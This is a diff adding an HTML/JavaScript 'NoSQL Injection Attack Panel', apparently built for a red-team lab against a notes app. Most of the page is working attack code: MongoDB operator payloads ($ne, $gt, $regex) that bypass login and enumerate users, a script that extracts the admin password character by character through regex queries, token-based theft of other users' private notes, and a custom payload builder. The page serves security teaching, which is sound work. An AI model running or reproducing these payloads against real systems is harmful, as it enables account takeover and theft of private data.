@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NoSQL Injection Attack Panel</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body { background: #0f0f1a; color: #e0e0e0; }
+
+        .attack-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .attack-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+            padding: 2rem;
+            background: linear-gradient(135deg, #1a0000 0%, #0f0f1a 100%);
+            border: 1px solid #ff4444;
+            border-radius: 12px;
+        }
+
+        .attack-header h1 {
+            color: #ff4444;
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .attack-header p {
+            color: #ff8888;
+            font-size: 0.95rem;
+        }
+
+        .attack-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+        }
+
+        .attack-panel {
+            background: #1a1a2e;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 1.5rem;
+        }
+
+        .attack-panel h2 {
+            color: #ff6b6b;
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .attack-panel .description {
+            color: #999;
+            font-size: 0.85rem;
+            margin-bottom: 1.2rem;
+            line-height: 1.5;
+        }
+
+        .payload-box {
+            background: #0d0d1a;
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: #7fdbca;
+            overflow-x: auto;
+            white-space: pre;
+            line-height: 1.6;
+        }
+
+        .payload-box .key { color: #c792ea; }
+        .payload-box .operator { color: #ff5572; }
+        .payload-box .string { color: #addb67; }
+
+        .btn-attack {
+            width: 100%;
+            padding: 0.75rem;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-attack.red {
+            background: linear-gradient(135deg, #ff4444, #cc0000);
+            color: white;
+        }
+
+        .btn-attack.red:hover {
+            background: linear-gradient(135deg, #ff6666, #dd2222);
+            transform: translateY(-1px);
+        }
+
+        .result-box {
+            margin-top: 1rem;
+            background: #0d0d1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            min-height: 60px;
+            display: none;
+            line-height: 1.6;
+        }
+
+        .result-box.success {
+            border-color: #00cc66;
+            color: #00cc66;
+        }
+
+        .result-box.fail {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+
+        .result-box.visible { display: block; }
+
+        /* Custom inputs section */
+        .custom-panel {
+            grid-column: 1 / -1;
+            background: #1a1a2e;
+            border: 1px solid #ff4444;
+            border-radius: 12px;
+            padding: 1.5rem;
+        }
+
+        .custom-panel h2 {
+            color: #ff6b6b;
+            margin-bottom: 1rem;
+        }
+
+        .custom-form {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .form-group-custom label {
+            display: block;
+            color: #999;
+            font-size: 0.85rem;
+            margin-bottom: 0.4rem;
+        }
+
+        .form-group-custom input,
+        .form-group-custom textarea {
+            width: 100%;
+            padding: 0.7rem;
+            background: #0d0d1a;
+            border: 1px solid #444;
+            border-radius: 6px;
+            color: #7fdbca;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            box-sizing: border-box;
+        }
+
+        .form-group-custom textarea {
+            min-height: 80px;
+            resize: vertical;
+        }
+
+        .custom-actions {
+            grid-column: 1 / -1;
+            display: flex;
+            gap: 1rem;
+        }
+
+        .stolen-notes {
+            grid-column: 1 / -1;
+        }
+
+        .notes-list {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .stolen-note-card {
+            background: #0d0d1a;
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 1rem;
+        }
+
+        .stolen-note-card h4 {
+            color: #c792ea;
+            margin-bottom: 0.5rem;
+        }
+
+        .stolen-note-card p {
+            color: #999;
+            font-size: 0.85rem;
+            line-height: 1.5;
+        }
+
+        .tag {
+            display: inline-block;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+
+        .tag.danger { background: #ff444433; color: #ff6b6b; }
+        .tag.warning { background: #ffaa0033; color: #ffcc44; }
+
+        .how-discover {
+            grid-column: 1 / -1;
+            background: #1a1a0e;
+            border: 1px solid #555522;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 0;
+        }
+
+        .how-discover h2 { color: #ffcc44; }
+        .how-discover ol { padding-left: 1.2rem; line-height: 2; color: #ccc; }
+        .how-discover code {
+            background: #0d0d1a;
+            padding: 0.15rem 0.4rem;
+            border-radius: 4px;
+            color: #7fdbca;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.82rem;
+        }
+
+        @media (max-width: 768px) {
+            .attack-grid { grid-template-columns: 1fr; }
+            .custom-form { grid-template-columns: 1fr; }
+            .notes-list { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <div class="attack-container">
+        <div class="attack-header">
+            <h1><i class="fa-solid fa-skull-crossbones"></i> NoSQL Injection Attack Panel</h1>
+            <p>For educational & research purposes ONLY — Red Team Penetration Testing</p>
+        </div>
+
+        <div class="attack-grid">
+
+            <!-- How to discover routes -->
+            <div class="how-discover">
+                <h2><i class="fa-solid fa-magnifying-glass"></i> Step 0: How an Attacker Discovers API Routes</h2>
+                <ol>
+                    <li>Open the target website and press <code>F12</code> to open DevTools</li>
+                    <li>Go to <strong>Network</strong> tab, then try to login with any credentials</li>
+                    <li>You'll see a request to <code>POST /api/auth/login</code> — that's the endpoint!</li>
+                    <li>Or simply right-click → <strong>View Page Source</strong> and search for <code>fetch</code> or <code>/api/</code></li>
+                    <li>The HTML source reveals: <code>action="/api/auth/login"</code> and <code>fetch('/api/auth/login')</code></li>
+                    <li>Once logged in, the Network tab also reveals <code>GET /api/notes</code>, <code>POST /api/notes</code>, etc.</li>
+                </ol>
+            </div>
+
+            <!-- Attack 1: $ne bypass -->
+            <div class="attack-panel">
+                <h2><i class="fa-solid fa-key"></i> Attack 1: Password Bypass ($ne)</h2>
+                <span class="tag danger">CRITICAL</span>
+                <p class="description">
+                    Login as <strong>admin</strong> without knowing the password.
+                    The <code>$ne</code> operator means "not equal to" — so password matches anything that isn't an empty string.
+                </p>
+                <div class="payload-box">{
+  <span class="key">"username"</span>: <span class="string">"admin"</span>,
+  <span class="key">"password"</span>: { <span class="operator">"$ne"</span>: <span class="string">""</span> }
+}</div>
+                <button class="btn-attack red" onclick="runAttack(1)">
+                    <i class="fa-solid fa-bolt"></i> Execute Attack
+                </button>
+                <div class="result-box" id="result1"></div>
+            </div>
+
+            <!-- Attack 2: $gt blind login -->
+            <div class="attack-panel">
+                <h2><i class="fa-solid fa-ghost"></i> Attack 2: Blind Login ($gt)</h2>
+                <span class="tag danger">CRITICAL</span>
+                <p class="description">
+                    Login without knowing ANY credentials at all.
+                    <code>$gt: ""</code> matches any non-empty string — returns the first user in the database.
+                </p>
+                <div class="payload-box">{
+  <span class="key">"username"</span>: { <span class="operator">"$gt"</span>: <span class="string">""</span> },
+  <span class="key">"password"</span>: { <span class="operator">"$gt"</span>: <span class="string">""</span> }
+}</div>
+                <button class="btn-attack red" onclick="runAttack(2)">
+                    <i class="fa-solid fa-bolt"></i> Execute Attack
+                </button>
+                <div class="result-box" id="result2"></div>
+            </div>
+
+            <!-- Attack 3: $regex enumeration -->
+            <div class="attack-panel">
+                <h2><i class="fa-solid fa-user-secret"></i> Attack 3: User Enumeration ($regex)</h2>
+                <span class="tag warning">HIGH</span>
+                <p class="description">
+                    Discover usernames by trying different starting letters.
+                    <code>$regex: "^s"</code> finds users whose name starts with "s".
+                </p>
+                <div class="payload-box">{
+  <span class="key">"username"</span>: { <span class="operator">"$regex"</span>: <span class="string">"^s"</span> },
+  <span class="key">"password"</span>: { <span class="operator">"$gt"</span>: <span class="string">""</span> }
+}</div>
+                <button class="btn-attack red" onclick="runAttack(3)">
+                    <i class="fa-solid fa-bolt"></i> Execute Attack
+                </button>
+                <div class="result-box" id="result3"></div>
+            </div>
+
+            <!-- Attack 4: Password extraction -->
+            <div class="attack-panel">
+                <h2><i class="fa-solid fa-lock-open"></i> Attack 4: Password Extraction ($regex)</h2>
+                <span class="tag danger">CRITICAL</span>
+                <p class="description">
+                    Extract admin's password character by character using regex.
+                    Try <code>^a</code>, <code>^ad</code>, <code>^adm</code>... until the full password is found.
+                </p>
+                <div class="payload-box">{
+  <span class="key">"username"</span>: <span class="string">"admin"</span>,
+  <span class="key">"password"</span>: { <span class="operator">"$regex"</span>: <span class="string">"^a"</span> }
+}</div>
+                <button class="btn-attack red" onclick="runAttack(4)">
+                    <i class="fa-solid fa-bolt"></i> Auto-Extract Password
+                </button>
+                <div class="result-box" id="result4"></div>
+            </div>
+
+            <!-- Attack 5: Target specific user -->
+            <div class="attack-panel">
+                <h2><i class="fa-solid fa-crosshairs"></i> Attack 5: Target Specific User</h2>
+                <span class="tag danger">CRITICAL</span>
+                <p class="description">
+                    Login as <strong>student2</strong> specifically, bypassing their password.
+                    <code>$ne</code> matches because the real password is never "wrongpassword".
+                </p>
+                <div class="payload-box">{
+  <span class="key">"username"</span>: <span class="string">"student2"</span>,
+  <span class="key">"password"</span>: { <span class="operator">"$ne"</span>: <span class="string">"wrongpassword"</span> }
+}</div>
+                <button class="btn-attack red" onclick="runAttack(5)">
+                    <i class="fa-solid fa-bolt"></i> Execute Attack
+                </button>
+                <div class="result-box" id="result5"></div>
+            </div>
+
+            <!-- Attack 6: Steal notes -->
+            <div class="attack-panel">
+                <h2><i class="fa-solid fa-file-shield"></i> Attack 6: Steal User's Notes</h2>
+                <span class="tag danger">CRITICAL</span>
+                <p class="description">
+                    After any successful injection above, use the stolen token to access that user's private notes.
+                </p>
+                <div class="payload-box">GET /api/notes
+Authorization: Bearer &lt;STOLEN_TOKEN&gt;</div>
+                <button class="btn-attack red" onclick="runAttack(6)">
+                    <i class="fa-solid fa-bolt"></i> Steal Notes (uses last stolen token)
+                </button>
+                <div class="result-box" id="result6"></div>
+                <div class="notes-list" id="stolenNotes"></div>
+            </div>
+
+            <!-- Custom attack panel -->
+            <div class="custom-panel">
+                <h2><i class="fa-solid fa-terminal"></i> Custom Attack — Build Your Own Payload</h2>
+                <div class="custom-form">
+                    <div class="form-group-custom">
+                        <label>Username field (JSON)</label>
+                        <input type="text" id="customUsername" value='{"$gt": ""}' placeholder='e.g. "admin" or {"$ne": ""}'>
+                    </div>
+                    <div class="form-group-custom">
+                        <label>Password field (JSON)</label>
+                        <input type="text" id="customPassword" value='{"$gt": ""}' placeholder='e.g. {"$ne": ""} or {"$regex": "^a"}'>
+                    </div>
+                    <div class="form-group-custom" style="grid-column: 1 / -1;">
+                        <label>Full Payload Preview</label>
+                        <textarea id="customPreview" readonly></textarea>
+                    </div>
+                    <div class="custom-actions">
+                        <button class="btn-attack red" onclick="runCustomAttack()" style="flex:1;">
+                            <i class="fa-solid fa-bolt"></i> Execute Custom Attack
+                        </button>
+                    </div>
+                </div>
+                <div class="result-box" id="resultCustom"></div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        let stolenToken = null;
+        let stolenUsername = null;
+
+        // Attack payloads
+        const attacks = {
+            1: { username: "admin", password: { "$ne": "" } },
+            2: { username: { "$gt": "" }, password: { "$gt": "" } },
+            3: { username: { "$regex": "^s" }, password: { "$gt": "" } },
+            5: { username: "student2", password: { "$ne": "wrongpassword" } }
+        };
+
+        async function runAttack(num) {
+            const resultBox = document.getElementById(`result${num}`);
+            resultBox.classList.add('visible');
+            resultBox.className = 'result-box visible';
+            resultBox.textContent = '⏳ Sending malicious payload...';
+
+            if (num === 4) {
+                await extractPassword(resultBox);
+                return;
+            }
+
+            if (num === 6) {
+                await stealNotes(resultBox);
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(attacks[num])
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    stolenToken = data.token;
+                    stolenUsername = data.username;
+                    resultBox.className = 'result-box visible success';
+                    resultBox.textContent = `✅ INJECTION SUCCESSFUL!\n` +
+                        `Logged in as: ${data.username}\n` +
+                        `Stolen token: ${data.token.substring(0, 20)}...`;
+                } else {
+                    resultBox.className = 'result-box visible fail';
+                    resultBox.textContent = `❌ Attack failed: ${data.message}`;
+                }
+            } catch (error) {
+                resultBox.className = 'result-box visible fail';
+                resultBox.textContent = `❌ Error: ${error.message}`;
+            }
+        }
+
+        // Attack 4: Auto-extract password character by character
+        async function extractPassword(resultBox) {
+            const charset = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            let extracted = '';
+            let found = true;
+
+            resultBox.textContent = '⏳ Extracting password for "admin"...\n';
+
+            while (found) {
+                found = false;
+                for (const char of charset) {
+                    const attempt = extracted + char;
+                    try {
+                        const response = await fetch('/api/auth/login', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                username: "admin",
+                                password: { "$regex": `^${attempt}` }
+                            })
+                        });
+
+                        if (response.ok) {
+                            const data = await response.json();
+                            extracted = attempt;
+                            stolenToken = data.token;
+                            stolenUsername = data.username;
+                            found = true;
+                            resultBox.className = 'result-box visible success';
+                            resultBox.textContent = `⏳ Extracting password for "admin"...\n\n` +
+                                `Progress: ${extracted}\n` +
+                                `Characters tried: ${charset.indexOf(char) + 1}/${charset.length} for position ${extracted.length}`;
+                            break;
+                        }
+                    } catch (e) { /* continue */ }
+                }
+            }
+
+            // Verify the extracted password with exact match
+            try {
+                const verify = await fetch('/api/auth/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: "admin", password: extracted })
+                });
+                const isExact = verify.ok;
+                resultBox.textContent = `✅ PASSWORD EXTRACTED!\n\n` +
+                    `Username: admin\n` +
+                    `Password: ${extracted}\n` +
+                    `Exact match verified: ${isExact ? 'YES ✓' : 'Partial (may contain special chars)'}`;
+            } catch (e) {
+                resultBox.textContent = `✅ PASSWORD EXTRACTED!\n\n` +
+                    `Username: admin\n` +
+                    `Password: ${extracted}`;
+            }
+        }
+
+        // Attack 6: Steal notes using stolen token
+        async function stealNotes(resultBox) {
+            if (!stolenToken) {
+                resultBox.className = 'result-box visible fail';
+                resultBox.textContent = '❌ No stolen token! Run Attack 1-5 first to get a token.';
+                return;
+            }
+
+            try {
+                const response = await fetch('/api/notes', {
+                    headers: { 'Authorization': `Bearer ${stolenToken}` }
+                });
+
+                const notes = await response.json();
+                const notesContainer = document.getElementById('stolenNotes');
+
+                if (response.ok && notes.length > 0) {
+                    resultBox.className = 'result-box visible success';
+                    resultBox.textContent = `✅ STOLEN ${notes.length} NOTES from "${stolenUsername}"!`;
+
+                    notesContainer.innerHTML = notes.map(note => `
+                        <div class="stolen-note-card">
+                            <h4><i class="fa-solid fa-file-lines"></i> ${escapeHtml(note.title)}</h4>
+                            <p>${escapeHtml(note.content)}</p>
+                        </div>
+                    `).join('');
+                } else {
+                    resultBox.className = 'result-box visible fail';
+                    resultBox.textContent = `No notes found for this user.`;
+                    notesContainer.innerHTML = '';
+                }
+            } catch (error) {
+                resultBox.className = 'result-box visible fail';
+                resultBox.textContent = `❌ Error: ${error.message}`;
+            }
+        }
+
+        // Custom attack
+        function runCustomAttack() {
+            const resultBox = document.getElementById('resultCustom');
+            resultBox.classList.add('visible');
+            resultBox.className = 'result-box visible';
+            resultBox.textContent = '⏳ Sending custom payload...';
+
+            let usernameVal, passwordVal;
+            try {
+                usernameVal = JSON.parse(document.getElementById('customUsername').value);
+            } catch {
+                usernameVal = document.getElementById('customUsername').value;
+            }
+            try {
+                passwordVal = JSON.parse(document.getElementById('customPassword').value);
+            } catch {
+                passwordVal = document.getElementById('customPassword').value;
+            }
+
+            fetch('/api/auth/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: usernameVal, password: passwordVal })
+            })
+            .then(async response => {
+                const data = await response.json();
+                if (response.ok) {
+                    stolenToken = data.token;
+                    stolenUsername = data.username;
+                    resultBox.className = 'result-box visible success';
+                    resultBox.textContent = `✅ INJECTION SUCCESSFUL!\n` +
+                        `Logged in as: ${data.username}\n` +
+                        `Stolen token: ${data.token.substring(0, 20)}...`;
+                } else {
+                    resultBox.className = 'result-box visible fail';
+                    resultBox.textContent = `❌ Attack failed: ${data.message}`;
+                }
+            })
+            .catch(error => {
+                resultBox.className = 'result-box visible fail';
+                resultBox.textContent = `❌ Error: ${error.message}`;
+            });
+        }
+
+        // Update preview when custom inputs change
+        function updatePreview() {
+            const u = document.getElementById('customUsername').value;
+            const p = document.getElementById('customPassword').value;
+            document.getElementById('customPreview').value = JSON.stringify(
+                { username: tryParse(u), password: tryParse(p) }, null, 2
+            );
+        }
+
+        function tryParse(val) {
+            try { return JSON.parse(val); } catch { return val; }
+        }
+
+        document.getElementById('customUsername').addEventListener('input', updatePreview);
+        document.getElementById('customPassword').addEventListener('input', updatePreview);
+        updatePreview();
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+    </script>
+</body>
+</html>
+
